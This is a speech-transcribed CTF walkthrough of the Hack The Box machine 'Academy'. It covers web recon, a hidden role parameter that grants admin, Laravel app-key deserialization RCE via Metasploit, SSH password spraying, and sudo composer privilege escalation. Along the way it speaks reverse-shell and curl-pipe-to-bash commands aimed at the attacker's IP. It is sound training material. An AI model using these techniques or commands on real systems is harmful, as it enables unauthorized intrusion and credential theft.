 what's going on youtube this is ipsack i'm doing academy from hack the box which had four steps to get to root i enjoyed all four steps but my very favorite one was the first step and that is getting a foothold on the box it's all about attacking php larval you find an old developer site that has an error message that leaks the application key and with that application key you can encrypt a serialized payload send it to the server and get code execution this may sound silly but it's something that happens in a lot of frameworks because the server itself doesn't want to track everything about a user session so it uses a secret only it should know that application key to put a bunch of information about the user sent to them then that user's browser has information about themselves signed from the server and like a cookie so when that browser sends it back to the server the server can view it and trust that no one modified it because only a server knows the secret to sign it and like asp this is like the view state parameter i believe wordpress does this as well with a bunch of secrets in wp-config even metasploit had an rce around this because installing metasploit didn't used to generate a random application key and since it's an open source project you could just look at github see the application key from meta point and then get code execution in ruby so it's a super common thing of just attacking frameworks so that's why i enjoyed this a lot i've used it to persist between two different pen tests because the company doesn't rotate their secrets of the web application even though you tell them to so again i just like this box because of that so with all that being said let's jump in as always we're going to start with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats and before we can put it in the directory we have to create that directory so put in the nmap directory caller academy and then the ip address of 10 10 10 to 15. i'm going to run that with the sudo because nmap likes having root privileges and then i'm also going to add the dash v so it shows me open ports as it finds them and we see just two ports open so far we have 22 and 80. so i'm going to take a look at port 80 so let's go over to 10 10 10 215 and the page isn't loading but if we look in the bottom left of a browser we can see academy.htb so it looks like it's redirecting us there so i'm going to do a curl against that ip address and well nmap has already finished so before i do that i'm going to add dashp dash to do all ports just so i have it if i need it that's the thing with recon you can do as much as you want and if you don't need it it's not time wasted because it only took you seconds to run the command and you can't really get your time back if you wanted to run more recon at a later time so always have that running in the background i'm adding the dash v flag to curl so it shows me the headers and we can see how that's working we make a get request to the web server and responds with a 302 which is a redirection and then the location is academy.hdb so the web server is telling us here go here um i'm going to add that to my host file so my box knows 10 10 10 215 is also academy.htb so now when i refresh this page we go to the page so the very first thing i want to do is check like robots.txt and we get not found we could try index.html index.php and great we found out it's a php website there are links on this site and we can go and view the source to see if there's anything interesting but before i dig in too much i just want to start a bunch of recon so we're going to run go buster actually twice so the very first time we're doing go buster we're going to use the directory mode the second time we're going to do v host to try to brute force a subdomain so i'm going to do dir and then word list up set list and then discovery uh web content raft small words and the reason why i use this word list now if you look at previous videos and a lot of other videos people do they use like that directory list 2.3 small or whatever it is um i switched away from that because it did not have dot get uh this directory and this is a pretty big one so instead of just adding that directory in that file and hoping like app doesn't change it ever i just switched to using a more up-to-date word list so we have this word list uh the next thing i want to do is specify extensions and we want to say php and then dash h for host i think or no u for url http academy.htb and then dash o for out file and i'm going to make a directory called go buster i'll put it in the go buster this will be dir root.log awesome so now let's do a second go buster so we'll do go buster v host and pretty much the same exact thing so dash w opt set list and this time we go well into discovery again but dns instead of web content and uh sub domains top million a big number dot text sounds like a good domain to check and the next flag is url again http academy.htb i'm going to add the dash v flag for reverse so it shows me everything because i wanted to make sure it's brute forcing the subdomain and it wasn't trying just to like look up the virtual host mx2 without this.academy.hdb so everything looks good so we'll do dash o for out go buster we'll call this v host sub dot text and start that go buster so now we got two of them running we got this nmap still running no additional ports we can finally go take a look at the website so we have a php site with a login and register function the very first thing i'm going to do is take a look at the login we can try admin admin admin password we can send this over to burp suite and i don't have burp suite up and running so let's start it and it's gonna say it's gonna expire soon in future videos i think i'm actually gonna switch to zap proxy and try playing that out because we've used burp suite for years and i want to try out something different but for this video since i don't know zap i'm going to use burp suite so let's go over to proxy intercept is on go to this turn that on i'm gonna say admin password it's in burp suite now so i can send it to repeater and then we can play with it so looks like invalid login is 292 bytes 2929 so let's try a single quote nothing double quote nothing um into outfile slash temp just see if we like crash this box uh nothing so looks like a bunch of my sequel testing did not work we could run this into like a another brute forcer to try to brute force a password because there is no um uh what is it cross site request forgery token so we can easily brute force passwords here as long as the account doesn't lock out but i don't like doing that too much we have two brute forces going on already let's just copy this to a file i'm going to make a directory called requests and we're going to put this as login.request so just like we did before we're gonna do more recon so if i look in this trip wait what i created it did i not put it in this directory okay um let's do login.req and that's what our login looks like awesome so now i can do sql map dash r login dot request dash dash batch and we have yet another thing going um oh we have a high open port three three zero six zero um that looks like a my sequel port i think like 3306 what is default my sequel uh default mysql uh let's turn brip suite off 33 or six i think is my sequel right yeah 33 6. so it listening on a non-standard port tells me maybe we can try logging into this database um sql map found nothing we can say level five risk three they could go a bit longer so mysql dash u root dash p dash each 10 10 10 to 15 33060 uh let's see through socket we don't want that let's see nc 10 10 10 2 15 3 3 0 6 0. i don't know what that port is um service mysql status am i running my sequel i am not so what i'm doing here is i'm starting the service i think this is so if i netcat against myself i can see what the header looks like so if i do netcat localhost 3306 i can see it responds with this so i don't think it's my sequel anymore because it's just give me blank so get slash http uh what's the header look like slash 1.1 broken pipe so no idea what that is but nmap is running scripts against it go buster is still going sql map now is taking a while because we did it like in super reverse mode so let's go take a look at the next piece of the website um i guess we have to go here then we can go to register looks like we can register a username so i'm going to go ipsec password of please subscribe and we go to successpage.php ipsec please subscribe and sweet we have the academy oh can we take courses uh it does not look like it unlock this course so it looks like all the functionality is kind of broken if you don't know if you go to academy.hackthebox.edu there'll be a big cyber security training page um highly recommend taking courses here there's tier zero courses which are free and um yeah i just recommend academy a lot and i put a lot of content in there myself even if i'm not listed i do just go and vet a lot of the courses and test it out and add things i'm trying to go to ipsec hack the box academy and if you want to know more about the academy here's this academy intro video but enough of that little small promotion let's see we got in progress the interesting thing is we registered as ipsec and we're egress so it looks like that is hard-coded uh settings filling purchase cubes i don't know what i can really click here um based upon how this is working this is all probably just javascript and everything is loaded uh we can go to burp suite turn proxy on make sure this is using proxy see if we ever make a web request but we're not so nothing really there let's go back to what go buster says uh it's only 52 percent done is the out file right in stream or is it just starting at the end deroot.log sweet v for three so i just want anything that wasn't four or three and we have images index login admin register config and home so we know what home is we probably want to look at config.php and admin.php so let's try going to uh turn this actually we can just get intercept off go to config.php probably a blank page that's typical php behavior i always like viewing the source because if something's in like the brackets then you won't see it and we can try admin.php let's try ipsec please subscribe one time for good measure just in case i typod and we don't have anything so let's go back to a proxy or history uh login config admin we don't really have anything in burp history i'm going to take a look at the registration function because that is the only thing we haven't looked at in depth um maybe if i register admin and then put a space at the end we can do some weird type confusion thing so let's see intercept on register the reason why i intercepted i wanted to make sure we had a space and we also have a hidden parameter role id i bet this is like not admin admin um out of curiosity i do want to see if we can register the same account twice so if we do admin i thought this redirect is to like success yeah success page so i sent it again this user exists we don't go to success page we do add moment to spaces you do success page so in this you can create users with a space after the name we'll revisit that role id in just a second but that is a pretty cool vulnerability especially on like message boards because we don't have the account admin but we have the account admin space so if we logged in and this wasn't like hard coded to just egress it would say we're logged in as admin and if there's like some type of direct messaging feature you can do a lot of cool social engineering with that and just look like you're the user because you have a very similar name you can also potentially abuse weird like unicode characters so like e with a dot over it may not be noticeable or there's a lot of just like weird greek characters that just look like the standard ascii character so you do a lot of things like that just to make usernames look like each other sometimes in web code it will do like they'll have a trim function which would remove spaces off admin if they're looking at the username if username is admin do something and grant access but it doesn't look like it's that so the next thing we want to do is just change this role id to 1 and see what happens so if i log in with ip the password of password and now we are in admin it gave us admin page.php so we completed the initial set of modules the website design test modules separate student admin role fix issue on dev staging dash 01.academy.htb so let's go to sudo vi etsy host and add this hostname and take a look at what this is so going to this page we get a error message um let's see vendor monologue this is a static page or an actual error i want to say this is a static page because i want if i go anywhere i get this page that's weird we see this is the framework laravel or larval or however you pronounce this so i'm going to take a look to see if there's any exploits for larval so search blight larval let's see password truncation administrator for unrestricted nova we got a um rce and metasploit so i'm gonna do pseudo msf db run and we're gonna try out metasploit i'm curious did this go buster v host finish it has not uh let's go in the go buster directory cat v host sub we have no directories i'm not sure if like devo won or whatever that is is in that word list ah let's go nmap finished sql injection is still going search laurevale use zero i know a lot of people don't like metasploit but i mean if it makes your job quicker definitely use it and also there are tricks to um sort of show config uh show options yeah but there are tricks to understand what metasploit is doing and use this to kind of speed up how you understand exploits so looking at this level token unserious exec we need an app key the base64 encoded app key from the env file um we have the environment so i'm going to just search for app key and we have a base64 value oh do we have like a password uh password is secret db username is homestead homestead secret awesome uh so set app key to that and then let's set proxies http on no slashes 127.001 because it wants type host port so 8080 and this is the trick i'm talking about so metasploit will now go to our brip suite window and we can analyze the exploit uh set our host this is going to be um what is the url devo1 academystaging.htb uh we don't need http okay set oh v host we probably want to put that as the same thing set lhost ton zero set l port 9001 and ton zero is just my vpn ip address so show options it looks like everything is good we can run this because we're doing a uh proxy we just had to set this one variable to reverse allow proxy to true and let's see is burp suite set to intercept i'm just going to turn off and we have this http history tab so we started a listener and we got a command shell open and if we look at this we can see what it did so i put something in this cross site request forgery token so let's analyze this um echo dash n base64 dash d uh looks like we got a weird object back so i'm going to do said s take a sp comma replace it with the line break sweet so we have iv value and mac let's take the value echo dash n base64-d and we have a blob um output i think ent is entropy it's near eight bytes so if it's near um eight bits per byte there's eight bits in a byte um it's probably going to be encrypted if we just take text like say etsy past wd i'm guessing this can be like 4.5 or something uh 4.8 because that's around what ascii is in entropy so this is pretty darn random so we know this is going to be encrypted and based upon like metasploit not doing anything but sending it here this is most likely going to be an encrypted value based upon the application key so what we want to do is find out how larval does encryption so encryption [Music] see uh aes 256 cbc so what i'm going to do is go to cyber chef and we can look at this so we want to decode as256 so aes decrypt cbc we got the key the iv and one hun so let's go over here actually go back to this tab right here we gotta grab the iv so we put the iv there and the input is not hex it is base64 and then the key that is on this page where's app key right here okay and then the input uh this is going to be this blob the value so copy that paste it on input and it's not hex it's base64 so i'm going to change it to raw because base64 is not an option here i'm going to go to a different recipe or whatever this is called operation from base64 we put it above as encrypt or a decrypt and let's see change this key to be base64 and we can suddenly see how this is so we can decrypt the value and it's doing a php serialized object and there's i guess a deserialization vulnerability if you want to know more about deserialization go to ipsec dot rocks and php desertization i'd go to the intro to php deserialization and that will be a good explanation of um where am i uh cyber chef how this is working so we're doing an event and we're calling pearl to do a reverse shell it's doing the address here 10 10 14 4 port 9001 so now that we know how that exploit works uh we no longer feel bad for using metasploit because we learned something so now with this shell i'm going to do python 3 c import pty pty dot spawn then bash and i actually don't know uh if this tty tricks works within metasploit so i'm going to try it stty raw minus echo fg oh god my cell's dead um exit exit uh shoot reset so i don't know how to fix this so i'm gonna kill this t-mux pain and we're going to redo metasploit so lesson learned you can't do the um tty trick to get a full shell from within metasploit i shouldn't know that one but was worth trying uh let's search laravel use xero use xero uh app sweet power host l host i'm just hitting control r to do this l port uh this we need v hearst ton zero we don't need a proxy should be fun run okay command shell opened so what i'm going to do is we'll listen on 9001 and say bash dash c bash dash i dev tcp 10 10 14 4 9 000 1 0 and 1. your standard reverse shell python 3 c import pty pty dot spawn bend bash sd2y raw minus echo fg there we go so now i have a regular terminal i can export term is equal to x term so now i can clear the screen and we can perk around on this box um the very first thing we had a username and password for my sequel so mysql dash u was it homestead dash p and i think secret uh let's see it was on this page uh this error password homestead secret maybe we have to specify the database uh homestead dash d oh home it's dead okay secret i don't know why the database isn't working h localhost secret h-o-m-e-s-t-e-a-d huh see host port is it lowercase h s-e-c-r-e-t that's weird okay uh let's see if we just go to cd home can we make a ssh key we can't i would just think if i could put some type of persistence on the box um we can check the password so if we go to hdb academy config cat database dot php forge forge let's try instead of homestead uh shoot let's try forge i'm going to fix my tty real quick uh because you keep noticing how like the cursor is like jumping a bunch occasionally it's because my sd2y is wrong so rows 34 columns 136. stty rows 34. calls 136 so now this should work dash d this is forge dash u this would be forge as well password of forge password nothing doesn't work let's see grab our eye password let's see it's pulling it from the environment again i didn't see okay it's sequel light i want to see um academy page is a sequel light or something env env oh it's pulling the environment variable forge okay so let's see there is a dot env file so database homestead username homestead password of secret that wasn't working i wonder if that's where the error message is maybe that user doesn't exist um yeah maybe that's why the page just isn't working uh let's go to academy if it's the same way sweet it is so let's do mysql dash capital d academy dash u dev dash p and try logging in with this okay i don't know we have my sequel running on this box don't know what 33060 is i'm pretty sure dash capital d is database mysql-h help man my sequel i know i could have done that for my command line database dash capital d yeah i'm not sure um let's see if we can ssh with that password so maker pw i don't want to make their rm-rfpw vpw my super password and then let's get a list of users so cat etsy passwd there are quite a few uh can we read anything in home find dot dash type f to dev null let's do dash writable nothing okay and we can get rid of writable and do it ls real quick i see bash history uh devnet devnl okay so we're getting a list of usernames that's a passwd we have a lot of these shells and the very last thing in pastwd is the login shell um summer sh summer bash so what i'm going to do is grep for sh dollar sign to show me everything that ends with sh and that should only be a few accounts so now i can awk dash f print one and now we have a list of usernames copy the users okay and go to opt crack map exec we can do poetry run i think's crack map is it cme um we'll find out ssh dash u uh what is it hdb academy users dash p for password hdb academy pw and see if this runs is it poetry crack map exec new one we can just do cme cme on my box is normally bort that's why i try to run it out of this directory yeah so let's see what is that command oh uh the command is just better syntax i didn't put the host name so it goes crack map exec uh protocol hostname then arguments and i think it's just cme if not let's try crack map exec that is not case sensitive but looks like cme works so now we're brute forcing ssh to see if any of these accounts work so root egress uh mr ben uh chronic worked so let's sh as him so ssh c-r-y-z-l-l-one t-i at academy.htv yes accept the key login i'll switch over to the bash shell because i like that shell what do we have here um nothing we can run win peace so make dirt dub dub dub or len p's opt privilege escalation let's get paul to pull the latest already up to date lynn pease cp lin p's um hdb academy www and ss lntp do i know what 33060 is yet i do not know what this port is this is driving me insane um i bet there's two databases actually mysql uh dash u dev uh was let's do hermstad dash h 12701 33060 secret i don't know how to specify port um dash p i don't know i'm probably doing something wrong with that mysql command but when we're root we should be able to see this port if there's another way or maybe the nps will tell us so let's curl 10 10 14 4 port 8000 nps.sh pipe it over to bash uh let's go into this directory python 3 hdb server and once it starts running for a few seconds i will go up and look at the top so yeah what do we have um we have the kernel right now and it's just taking its sweet time um okay i was about to say i'm about to just pause the video and we'll come to this when it finishes but i haven't really done any editing magic so far so hopefully we just get one straight play through uh let's see is it going to stop posting things uh seoid is a good spot to stop so let's go look at things pseudo version uh this is probably exploitable via the sudo exploit cpu info that ba was highlighted just because that's what i used to go to the top text it is vmware looking at the software processes lots and lots of apache there's my reverse shell there's another reverse shell from metasploit this box is all so it's a pound is uh another reverse shell and another one so we got lots going on here apache cron jobs we have a php cron that's interesting system path hp sockets network information active ports all these and time weight is probably because of my sequel map still running let's see pk exec use with console uh we are in the adm group and that is not standard uh adm by default can read ver log so i'm guessing we gotta do something with ver log we do have some hashes these are in decrypt format so we could also try cracking those see db connection app name i'm so confused why i'm gonna try this one more time i know in the videos i'm gonna be so bad upset when i look at the comments and see what mistake i was making uh db pass so this is going to be my super password uh cd ver www we can go to the shell i really want to crack other user passwords so database academy username is dev password is this so our username is dev database is academy let's see i don't think it's a lowercase h let's see my sequel client specify host mysql dash h username password let's see academy.htb okay etsy hosts acad emy [Music] i don't know i'm sure if you look in the youtube comments someone will say what i was missing but we were in the adm group so for our log and see if we see anything here um ri password that is a lot apache era log that's our go buster see cloud and net that's doing interesting things of just them building the box i guess but it's protecting sensitive information get password let's look at the access log so apache let's see cat access log dot one let's grab dash v uh gear buster i'm gonna add a i so it's not case sensitive and we'll also get rid of this chrome string see options this is nmap i believe let's get rid of firefox dummy so we don't really have anything uh we can do zcat on all the other logs to see what else there is a z cat's just going to take the dot gz and uncompress it and then view it and we have a lot more um we can get rid of that as well there was a rust buster i saw get rid of rust and we have still a lot of data so what i'm going to do is one two let's let's look at all the host so let's just zcat this and we will awk print one sort wc-l sort unique c there we go i wonder who i guess 10 10 14 4 is me i'm doing z cat so this should be older data so who is 10 10 14 4 what is he doing grep 10 10 14 4 uh register using curl there mozilla so one two three four five six seven i'm gonna do the same thing but i'm gonna try to look at the page so where's my arc command 7 that is mostly the pages sort there's a better way to do this type of analysis and if this part doesn't draw me to the right spot then we will let's see sort wc-c yeah there's a lot of just ones so this is probably because like go buster and stuff was running so this is not gonna help us so let's instead switch gears and see what other logs we have um there's audit it's audit deconfigured looks like it is so if i can't audit what is this doing so um audit this is much like if you watch my snoopy video on the hack the box channel uh hack the box youtube it's actually not on my channel let's see maybe just youtube.com hack the box my channel has pretty good seo if i can mask the heck the box channel but um this blue team gameplay audit d is doing this kind of the correct way the reason why i chose to do snoopy and this blue team thing is because it works on more os's audit d has some weird sometimes like unique configurations per distribution so i don't want to deal with that issue so i use snoopy which is doing this but in ld preload instead of the proper way so we can see a list of every process that is starting there is a program au report and that's going to analyze all these audits so if we do a you report dash h i don't know how it's trying to help no cancel it's doing some type of statistics there we go so we have like tty keystrokes usernames uh key login so it's going through this and just doing a report based upon things which is pretty cool so if we don't give it any arguments you can see c1 changes configuration 20 logins 37 failed logins 11 different terminals so we can do tty to look at like the terminals and see uh what happened and we see an sh sq mr ben and i'm guessing this time they did like s u and asked what user or they did s u and pasted their password because we do have a password here we can probably uh i was gonna say we could probably see our stuff but i don't think we can so if we su mr ben i have two su's mr b3n paste the password uh do i have the password correctly i don't have the exclamation point at the end probably because i double clicked and double click doesn't grab the special character at the end maybe that's why um exclamation points are such a good special character used for password but now we are mr ben let's do bash cd home and let's look at groups i'm not a member of any group i guess curl 10 10 14. 4 port 8 000 linps.sh pipe it over to bash and let's see what this one outputs we can say sh mr ben at 10 10 10 to 15 paste the password uh bash slash dash user mr ben to devno let's see we can grab dash v proc and run i think with the two things i didn't want to see and cis cis so this is just showing me files owned by mr ben uh we see devpts three nothing really just stuff in my home folder the hd access is unique deny from all okay uh psef psef or ss lntp still can't see what that 33060 is uh is my this is finished so let's see what we can do uh the pseudo exploit this is looking to be the same except we got more of our shells now cron jobs oh we never looked at the php cron job super users logins last i wanted to switch to the egress user because he's logged in as well see apache server uh nothing too interesting we could try going back to that my sequel thing again going in the database but i do not feel like doing that uh can we pseudo uh password oh shoot um what was this password we should have logged that let's go back here exit exit where's aureport mr ben underscore academy city l ah i can run composer as any user so i can just run composer as root so let's go to gtfo bins and look at what composer is uh pseudo sweet uh the very first thing i'm going to do vpw paste this so we have that saved and then let's see pseudo composer run script x so what that's doing it's um making a temp directory and then putting a file called script that's going to execute bash and then have sudo composer working directory is our temp and then running the script id and we're root so that is the box hope you guys enjoyed it take care and i will see you all next week oh there is academy.txt uh cat academy.txt just announcing that the academy is open so uh yeah take care and i will see you all next week